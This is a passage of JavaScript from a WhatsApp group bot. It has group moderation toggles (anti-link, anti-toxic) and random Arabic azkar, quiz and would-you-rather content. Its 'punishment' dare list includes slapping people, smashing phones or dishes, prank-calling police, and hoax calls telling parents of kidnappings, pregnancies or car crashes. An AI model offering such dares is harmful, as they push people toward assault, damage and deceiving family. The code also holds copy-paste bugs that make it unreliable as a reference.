fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning off twitter antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning on all antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning off all antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiToxic) return m.reply('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('Success in turning on antitoxic in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('Success in turning off antitoxic in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'autoreply': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Autoreply) return m.reply('Already activated')
autorep.push(from)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning on auto reply in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Autoreply) return m.reply('Already deactivated')
let off = autorep.indexOf(from)
autorep.splice(off, 1)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning off auto reply in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiWame) return m.reply('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return m.reply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return m.reply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
  case 'اذكار': case 'azkar':
    const dare =[
        "‏الحمـدلله حمـدًا كثـيـرًا طيبـًا مباركـًا فيه .",
        "‏اللَّهُمَّ إِنِّي أَسْأَلُكَ عِلْمًا نَافِعًا، وَرِزْقًا طَيِّبًا، وَعَمَلًا مُتَقَبَّلًا.",
        "‏اللَّهُمَّ إِنِّي أَسْأَلُكَ رَحْمَةً مِنْ عِنْدِكَ ، تَهْدِي بِهَا قَلْبِي ، وَتَجْمَعُ بِهَا أَمْرِي ، وَتَلُمُّ بِهَا شَعَثِي ، وَتُصْلِحُ بِهَا غَائِبِي ، وَتَرْفَعُ بِهَا شَاهِدِي ، وَتُزَكِّي بِهَا عَمَلِي ، وَتُلْهِمُنِي بِهَا رُشْدِي ، وَتَرُدُّ بِهَا أُلْفَتِي 🤲",
        "لقد أغلقَ الله بعض الطرق حتى لا نضيع🤎🌱",
        "اللهُم إنّا نسألُك جبراً للقلوب ‏وتيسيراً للأمور ‏وبُعداً عن كل خذلان ‏وحمايةً مِن كل أذى ، ‏وتدبيراً مِنك لكل أمورنا .🤎🌱",
        "اللهُمَّ خيرَ الأيامِ وأحنَّها  ‏ اللهُمَّ خيرَ الأشخاصِ وألطفهم .🤎🌱",
        "اللهُم لكَ الحمد والشُّكر حتى ترضى.. 🤎🌱",
        "‏لا إلهَ إلَّا اللهُ وحدَه لا شريكَ له ، له المُلكُ وله الحمْدُ ،وهو على كلِّ شيءٍ قديرٌ .",
        "-اللَّهُمَّ رَحْمتَكَ أَرْجو فلا تَكِلْني إلى نفسي طَرْفةَ عَينٍ وأصلِحْ لي شأني كُلَّه، لا إِلَهَ إلَّا أنتَ.",
        "أَعُوذُ بِاللهِ مِنْ الشَّيْطَانِ الرَّجِيمِ اللّهُ لاَ إِلَـهَ إِلاَّ هُوَ الْحَيُّ الْقَيُّومُ لاَ تَأْخُذُهُ سِنَةٌ وَلاَ نَوْمٌ لَّهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الأَرْضِ مَن ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلاَّ بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلاَ يُحِيطُونَ بِشَيْءٍ مِّنْ عِلْمِهِ إِلاَّ بِمَا شَاء وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالأَرْضَ وَلاَ يَؤُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ.",
        "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم قُلْ هُوَ ٱللَّهُ أَحَدٌ، ٱللَّهُ ٱلصَّمَدُ، لَمْ يَلِدْ وَلَمْ يُولَدْ، وَلَمْ يَكُن لَّهُۥ كُفُوًا أَحَدٌۢ. ",
        "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم قُلْ أَعُوذُ بِرَبِّ ٱلْفَلَقِ، مِن شَرِّ مَا خَلَقَ، وَمِن شَرِّ غَاسِقٍ إِذَا وَقَبَ، وَمِن شَرِّ ٱلنَّفَّٰثَٰتِ فِى ٱلْعُقَدِ، وَمِن شَرِّ حَاسِدٍ إِذَا حَسَدَ.",
        "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم قُلْ أَعُوذُ بِرَبِّ ٱلنَّاسِ، مَلِكِ ٱلنَّاسِ، إِلَٰهِ ٱلنَّاسِ، مِن شَرِّ ٱلْوَسْوَاسِ ٱلْخَنَّاسِ، ٱلَّذِى يُوَسْوِسُ فِى صُدُورِ ٱلنَّاسِ، مِنَ ٱلْجِنَّةِ وَٱلنَّاسِ.",
        "أَصْـبَحْنا وَأَصْـبَحَ المُـلْكُ لله وَالحَمدُ لله، لا إلهَ إلاّ اللّهُ وَحدَهُ لا شَريكَ لهُ، لهُ المُـلكُ ولهُ الحَمْـد، وهُوَ على كلّ شَيءٍ قدير، رَبِّ أسْـأَلُـكَ خَـيرَ ما في هـذا اليوم وَخَـيرَ ما بَعْـدَه، وَأَعـوذُ بِكَ مِنْ شَـرِّ ما في هـذا اليوم وَشَرِّ ما بَعْـدَه، رَبِّ أَعـوذُ بِكَ مِنَ الْكَسَـلِ وَسـوءِ الْكِـبَر، رَبِّ أَعـوذُ بِكَ مِنْ عَـذابٍ في النّـارِ وَعَـذابٍ في القَـبْر.",
        "اللّهـمَّ أَنْتَ رَبِّـي لا إلهَ إلاّ أَنْتَ، خَلَقْتَنـي وَأَنا عَبْـدُك، وَأَنا عَلـى عَهْـدِكَ وَوَعْـدِكَ ما اسْتَـطَعْـت، أَعـوذُ بِكَ مِنْ شَـرِّ ما صَنَـعْت، أَبـوءُ لَـكَ بِنِعْـمَتِـكَ عَلَـيَّ وَأَبـوءُ بِذَنْـبي فَاغْفـِرْ لي فَإِنَّـهُ لا يَغْـفِرُ الذُّنـوبَ إِلاّ أَنْتَ.",
        "رَضيـتُ بِاللهِ رَبَّـاً وَبِالإسْلامِ ديـناً وَبِمُحَـمَّدٍ صلى الله عليه وسلم نَبِيّـاً. ",
        "اللّهُـمَّ إِنِّـي أَصْبَـحْتُ أُشْـهِدُك، وَأُشْـهِدُ حَمَلَـةَ عَـرْشِـك، وَمَلَائِكَتَكَ، وَجَمـيعَ خَلْـقِك، أَنَّـكَ أَنْـتَ اللهُ لا إلهَ إلاّ أَنْـتَ وَحْـدَكَ لا شَريكَ لَـك، وَأَنَّ ُ مُحَمّـداً عَبْـدُكَ وَرَسـولُـك.",
        "اللّهُـمَّ ما أَصْبَـَحَ بي مِـنْ نِعْـمَةٍ أَو بِأَحَـدٍ مِـنْ خَلْـقِك ، فَمِـنْكَ وَحْـدَكَ لا شريكَ لَـك ، فَلَـكَ الْحَمْـدُ وَلَـكَ الشُّكْـر. ",
        "حَسْبِـيَ اللّهُ لا إلهَ إلاّ هُوَ عَلَـيهِ تَوَكَّـلتُ وَهُوَ رَبُّ العَرْشِ العَظـيم.",
        "من قالها كفاه الله ما أهمه من أمر الدنيا والأخرة.",
        "بِسـمِ اللهِ الذي لا يَضُـرُّ مَعَ اسمِـهِ شَيءٌ في الأرْضِ وَلا في السّمـاءِ وَهـوَ السّمـيعُ العَلـيم.",
        "اللّهُـمَّ بِكَ أَصْـبَحْنا وَبِكَ أَمْسَـينا، وَبِكَ نَحْـيا وَبِكَ نَمُـوتُ وَإِلَـيْكَ النُّـشُور.",
        "أَصْبَـحْـنا عَلَى فِطْرَةِ الإسْلاَمِ، وَعَلَى كَلِمَةِ الإِخْلاَصِ، وَعَلَى دِينِ نَبِيِّنَا مُحَمَّدٍ صَلَّى اللهُ عَلَيْهِ وَسَلَّمَ، وَعَلَى مِلَّةِ أَبِينَا إبْرَاهِيمَ حَنِيفاً مُسْلِماً وَمَا كَانَ مِنَ المُشْرِكِينَ.",
        "سُبْحـانَ اللهِ وَبِحَمْـدِهِ عَدَدَ خَلْـقِه، وَرِضـا نَفْسِـه، وَزِنَـةَ عَـرْشِـه، وَمِـدادَ كَلِمـاتِـه.",
        "اللّهُـمَّ عافِـني في بَدَنـي، اللّهُـمَّ عافِـني في سَمْـعي، اللّهُـمَّ عافِـني في بَصَـري، لا إلهَ إلاّ أَنْـتَ.",
        "اللّهُـمَّ إِنّـي أَعـوذُ بِكَ مِنَ الْكُـفر، وَالفَـقْر، وَأَعـوذُ بِكَ مِنْ عَذابِ القَـبْر، لا إلهَ إلاّ أَنْـتَ.",
        "اللّهُـمَّ إِنِّـي أسْـأَلُـكَ العَـفْوَ وَالعـافِـيةَ في الدُّنْـيا وَالآخِـرَة، اللّهُـمَّ إِنِّـي أسْـأَلُـكَ العَـفْوَ وَالعـافِـيةَ في ديني وَدُنْـيايَ وَأهْـلي وَمالـي، اللّهُـمَّ اسْتُـرْ عـوْراتي وَآمِـنْ رَوْعاتي، اللّهُـمَّ احْفَظْـني مِن بَـينِ يَدَيَّ وَمِن خَلْفـي وَعَن يَمـيني وَعَن شِمـالي، وَمِن فَوْقـي، وَأَعـوذُ بِعَظَمَـتِكَ أَن أُغْـتالَ مِن تَحْتـي.",
        "يَا حَيُّ يَا قيُّومُ بِرَحْمَتِكَ أسْتَغِيثُ أصْلِحْ لِي شَأنِي كُلَّهُ وَلاَ تَكِلْنِي إلَى نَفْسِي طَـرْفَةَ عَيْنٍ.",
        "أَصْبَـحْـنا وَأَصْبَـحْ المُـلكُ للهِ رَبِّ العـالَمـين، اللّهُـمَّ إِنِّـي أسْـأَلُـكَ خَـيْرَ هـذا الـيَوْم ، فَـتْحَهُ، وَنَصْـرَهُ، وَنـورَهُ وَبَـرَكَتَـهُ، وَهُـداهُ، وَأَعـوذُ بِـكَ مِـنْ شَـرِّ ما فـيهِ وَشَـرِّ ما بَعْـدَه.",
        "اللّهُـمَّ عالِـمَ الغَـيْبِ وَالشّـهادَةِ فاطِـرَ السّماواتِ وَالأرْضِ رَبَّ كـلِّ شَـيءٍ وَمَليـكَه، أَشْهَـدُ أَنْ لا إِلـهَ إِلاّ أَنْت، أَعـوذُ بِكَ مِن شَـرِّ نَفْسـي وَمِن شَـرِّ الشَّيْـطانِ وَشِرْكِهِ، وَأَنْ أَقْتَـرِفَ عَلـى نَفْسـي سوءاً أَوْ أَجُـرَّهُ إِلـى مُسْـلِم.",
        "أَعـوذُ بِكَلِمـاتِ اللّهِ التّـامّـاتِ مِنْ شَـرِّ ما خَلَـق.",
        "اللَّهُمَّ صَلِّ وَسَلِّمْ وَبَارِكْ على سيدنا مُحمَّد.",
        "اللَّهُمَّ إِنَّا نَعُوذُ بِكَ مِنْ أَنْ نُشْرِكَ بِكَ شَيْئًا نَعْلَمُهُ، وَنَسْتَغْفِرُكَ لِمَا لَا نَعْلَمُهُ.",
        "اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنْ الْهَمِّ وَالْحَزَنِ، وَأَعُوذُ بِكَ مِنْ الْعَجْزِ وَالْكَسَلِ، وَأَعُوذُ بِكَ مِنْ الْجُبْنِ وَالْبُخْلِ، وَأَعُوذُ بِكَ مِنْ غَلَبَةِ الدَّيْنِ، وَقَهْرِ الرِّجَالِ.",
        "أسْتَغْفِرُ اللهَ العَظِيمَ الَّذِي لاَ إلَهَ إلاَّ هُوَ، الحَيُّ القَيُّومُ، وَأتُوبُ إلَيهِ.",
        "يَا رَبِّ، لَكَ الْحَمْدُ كَمَا يَنْبَغِي لِجَلَالِ وَجْهِكَ، وَلِعَظِيمِ سُلْطَانِكَ.",
        "اللَّهُمَّ إِنِّي أَسْأَلُكَ عِلْمًا نَافِعًا، وَرِزْقًا طَيِّبًا، وَعَمَلًا مُتَقَبَّلًا.",
        "اللَّهُمَّ أَنْتَ رَبِّي لا إِلَهَ إِلا أَنْتَ، عَلَيْكَ تَوَكَّلْتُ ، وَأَنْتَ رَبُّ الْعَرْشِ الْعَظِيمِ، مَا شَاءَ اللَّهُ كَانَ، وَمَا لَمْ يَشَأْ لَمْ يَكُنْ، وَلا حَوْلَ وَلا قُوَّةَ إِلا بِاللَّهِ الْعَلِيِّ الْعَظِيمِ، أَعْلَمُ أَنَّ اللَّهَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ، وَأَنَّ اللَّهَ قَدْ أَحَاطَ بِكُلِّ شَيْءٍ عِلْمًا، اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنْ شَرِّ نَفْسِي، وَمِنْ شَرِّ كُلِّ دَابَّةٍ أَنْتَ آخِذٌ بِنَاصِيَتِهَا ، إِنَّ رَبِّي عَلَى صِرَاطٍ مُسْتَقِيمٍ.",
        "لَا إلَه إلّا اللهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءِ قَدِيرِ.",
        "كانت له عدل عشر رقاب، وكتبت له مئة حسنة، ومحيت عنه مئة سيئة، وكانت له حرزا من الشيطان.",
        "سُبْحـانَ اللهِ وَبِحَمْـدِهِ.",
        "حُطَّتْ خَطَايَاهُ وَإِنْ كَانَتْ مِثْلَ زَبَدِ الْبَحْرِ، لَمْ يَأْتِ أَحَدٌ يَوْمَ الْقِيَامَةِ بِأَفْضَلَ مِمَّا جَاءَ بِهِ إِلَّا أَحَدٌ قَالَ مِثْلَ مَا قَالَ أَوْ زَادَ عَلَيْهِ.",
        "أسْتَغْفِرُ اللهَ وَأتُوبُ إلَيْهِ.",
        "لا إلَهَ إلَّا اللَّهُ، وحْدَهُ لا شَرِيكَ له، له المُلْكُ وله الحَمْدُ، وهو علَى كُلِّ شيءٍ قَدِيرٌ.",
        "‏حَسْبِيَ اللّهُ لا إلهَ إلاّ هُوَ عَلَيهِ تَوَكَّلتُ وَهوَ رَبُّ العَرْشِ العَظيم .",
        "‏اللّٰهُمَّ تُبْ عَلَيْنَا إِنَّكَ أَنتَ التَّوَّابُ الرَّحِيمُ .",
        "يَا أَيُّهَا الَّذِينَ آمَنُوا صَلُّوا عَلَيْهِ وَسَلِّمُوا تَسْلِيمًا",
        "‏الـلَّـهُــمَّ ثَبِّــتْ قَلْـبِـي عَلَـى دِينِـكَ .",
        "‏اللهم كُن معنا في كل أمر من أمور الدنيا والأخرة فإنه لا حول ولا قوة لنا إلا بك🤎🌱",
        "قال النبي صلى الله عليه وسلم: «ركعتا الفجر خير من الدنيا وما فيها",
        "اللهم إن لي تحت أرضك شخصاً أعز علي مما على الأرض جميعاً اللهُم ارحمه رحمة لم يدعُ بها داعِ و لم تخطر على قلب بشر، اللهم أسعده في قبره و اجعله في نعيم، اللهُم بشّره بجنةٍ فيها ما لا عين رأت و لا أذن سمعت و لا خطر على قلب بشر يارب العالمين",
        "- أستغفِرُ اللهَ الَّذي لا إلهَ إلَّا هوَ الحيُّ القَيومُ وأتوبُ إليهِ ..🤎🌱"
]
    const xeondare = dare[Math.floor(Math.random() * dare.length)]
    bufferdare = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttons = [
        {buttonId: `azkar`, buttonText: {displayText: ' اذكار اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttons, image: bufferdare, caption: ' \n\n'+ xeondare }, {quoted:m})
    break
    case 'عقاب': case 'katu':
        const katu =[
            "*صورة وجهك او رجلك او خشمك او يدك*.",
"*اصدر اي صوت يطلبه منك الاعبين*.",
"*سكر خشمك و قول كلمة من اختيار الاعبين الي معك*.",
"*روح الى اي قروب عندك في الواتس اب و اكتب اي شيء يطلبه منك الاعبينالحد الاقصى 3 رسائل*.",
"*قول نكتة ولازم احد الاعبين يضحك اذا ضحك يعطونك ميوت الى ان يجي دورك مرة ثانية*.",
"*سمعنا صوتك و غن اي اغنية من اختيار الاعبين الي معك*.",
"*ذي المرة لك لا تعيدها*.",
"*ارمي جوالك على الارض بقوة و اذا انكسر صور الجوال و ارسله في الشات العام*.",
"*صور اي شيء يطلبه منك الاعبين*.",
"*اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....*.",
"*سكر خشمك و قول كلمة من اختيار الاعبين الي معك*.",
"*اعطي اي احد جنبك كف اذا مافيه احد جنبك اعطي نفسك و نبي نسمع صوته*.",
"*ارمي جوالك على الارض بقوة و اذا انكسر صور الجوال و ارسله في الشات العام*.",
"*روح عند اي احد بالخاص و قول له انك تحبه و الخ*.",
"*اكتب في الشات اي شيء يطلبه منك الاعبين في الخاص*.",
"*قول نكتة اذا و لازم احد الاعبين يضحك اذا محد ضحك يعطونك ميوت الى ان يجي دورك مرة ثانية*.",
"*سامحتك خلاص مافيه عقاب لك *.",
"*اتصل على احد من اخوياكخوياتك , و اطلب منهم مبلغ على اساس انك صدمت بسيارتك*.",
"*غير اسمك الى اسم من اختيار الاعبين الي معك*.",
"*اتصل على امك و قول لها انك تحبها *.",
"*لا يوجد سؤال لك سامحتك *.",
"*قل لواحد ماتعرفه عطني كف*.",
"*منشن الجميع وقل انا اكرهكم*.",
"*اتصل لاخوك و قول له انك سويت حادث و الخ....*.",
"*روح المطبخ و اكسر صحن *.",
"*اعطي اي احد جنبك كف اذا مافيه احد جنبك اعطي نفسك و نبي نسمع صوت الكف*.",
"*قول لاي بنت موجود في الروم كلمة حلوه*.",
"*تكلم باللغة الانجليزية الين يجي دورك مرة ثانية لازم تتكلم اذا ما تكلمت تنفذ عقاب ثاني*.",
"*لا تتكلم ولا كلمة الين يجي دورك مرة ثانية و اذا تكلمت يجيك باند لمدة يوم كامل من السيرفر*.",
"*قول قصيدة *.",
"*تكلم باللهجة السودانية الين يجي دورك مرة ثانية*.",
"*اتصل على احد من اخوياكخوياتك , و اطلب منهم مبلغ على اساس انك صدمت بسيارتك*.",
"*اول واحد تشوفه عطه كف*.",
"*سو مشهد تمثيلي عن اي شيء يطلبه منك الاعبين*.",
"*سامحتك خلاص مافيه عقاب لك *.",
"*اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....*.",
"*روح اكل ملح + ليمون اذا مافيه اكل اي شيء من اختيار الي معك*.",
"*تاخذ عقابين*.",
"*قول اسم امك افتخر بأسم امك*.",
"*ارمي اي شيء قدامك على اي احد موجود او على نفسك*.",
"*اذا انت ولد اكسر اغلى او احسن عطور عندك اذا انتي بنت اكسري الروج حقك او الميك اب حقك*.",
"*اذهب الى واحد ماتعرفه وقل له انا كيوت وابي بوسه*.",
"*تتصل على الوالدهو تقول لها خطفت شخص*.",
"* تتصل على الوالدهو تقول لها تزوجت با سر*.",
"*اتصل على الوالدهو تقول لهااحب وحده*.",
"*تتصل على شرطي تقول له عندكم مطافي*.",
"*خلاص سامحتك*.",
"* تصيح في الشارع انامجنوون*.",
"* تروح عند شخص وقول له احبك*."
    ]
        const xeonkatu = katu[Math.floor(Math.random() * katu.length)]
        bufferkatu = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
        let buttgons = [
            {buttonId: `katu`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
            ] 
        XeonBotInc.sendMessage(from, { buttons: buttgons, image: bufferkatu, caption: '\n'+ xeonkatu }, {quoted:m})
        break
        case 'اسئله': case 'askss':
    const askss =[
"ماهو اطول نهر في العالم \n1- النيل  \n2- الفرات \n3- نهر الكونغو\n✧ ارسل  الجواب الصحيح فقط",
"ماعدد عظام الوجه؟\n1- 15\n2- 13\n3- 14 \n✧ ارسل  الجواب الصحيح فقط",
"كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون؟\n1- الفم \n2- الاذن\n3- الثلاجه\n✧ ارسل  الجواب الصحيح فقط"
]
    const xeonaskss = askss[Math.floor(Math.random() * askss.length)]
    bufferaskss = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttoaskssns = [
        {buttonId: `askss`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttoaskssns, image: bufferaskss, caption: ''+ xeonaskss }, {quoted:m})
    break
    case 'لوخيروك':case 'خيرني':case 'خيروك': case 'andav':
    const andav =[
"لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟ ",
"لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ ",
"لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ ",
"لو خيروك |  بين تناول البيتزا وبين الآيس كريم وذلك بشكل دائم؟ ",
"لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ ",
"لو خيروك |  بين تغيير وظيفتك كل سنة أو البقاء بوظيفة واحدة طوال حياتك؟ ",
"لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ ",
"لو خيروك |  بين الذهاب إلى الماضي والعيش مع جدك أو بين الذهاب إلى المستقبل والعيش مع أحفادك؟ ",
"لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ ",
"لو خيروك |  بين الحصول على الأموال في عيد ميلادك أو على الهدايا؟ ",
"لو خيروك |  بين القفز بمظلة من طائرة أو الغوص في أعماق البحر؟ ",
"لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ ",
"لو خيروك |  بين أن تكون رئيس لشركة فاشلة أو أن تكون موظف في شركة ناجحة؟ ",
"لو خيروك |  بين أن يكون لديك جيران صاخبون أو أن يكون لديك جيران فضوليون؟ ",
"لو خيروك |  بين أن تكون شخص مشغول دائمًا أو أن تكون شخص يشعر بالملل دائمًا؟ ",
"لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ ",
"لو خيروك |  بين استمرار فصل الشتاء دائمًا أو بقاء فصل الصيف؟ ",
"لو خيروك |  بين العيش في القارة القطبية أو العيش في الصحراء؟ ",
"لو خيروك |  بين أن تكون لديك القدرة على حفظ كل ما تسمع أو تقوله وبين القدرة على حفظ كل ما تراه أمامك؟ ",
"لو خيروك |  بين أن يكون طولك 150 سنتي متر أو أن يكون 190 سنتي متر؟ ",
"لو خيروك |  بين إلغاء رحلتك تمامًا أو بقائها ولكن فقدان الأمتعة والأشياء الخاص بك خلالها؟ ",
"لو خيروك |  بين أن تكون اللاعب الأفضل في فريق كرة فاشل أو أن تكون لاعب عادي في فريق كرة ناجح؟ ",
"لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ ",
"لو خيروك |  بين امتلاك أفضل وأجمل منزل ولكن في حي سيء أو امتلاك أسوأ منزل ولكن في حي جيد وجميل؟ ",
"لو خيروك |  بين أن تكون غني وتعيش قبل 500 سنة، أو أن تكون فقير وتعيش في عصرنا الحالي؟ ",
"لو خيروك |  بين ارتداء ملابس الغوص ليوم كامل والذهاب إلى العمل أو ارتداء ملابس جدك/جدتك؟ ",
"لو خيروك |  بين قص شعرك بشكل قصير جدًا أو صبغه باللون الوردي؟ ",
"لو خيروك |  بين أن تضع الكثير من الملح على كل الطعام بدون علم أحد، أو أن تقوم بتناول شطيرة معجون أسنان؟ ",
"لو خيروك |  بين قول الحقيقة والصراحة الكاملة مدة 24 ساعة أو الكذب بشكل كامل مدة 3 أيام؟ ",
"لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ ",
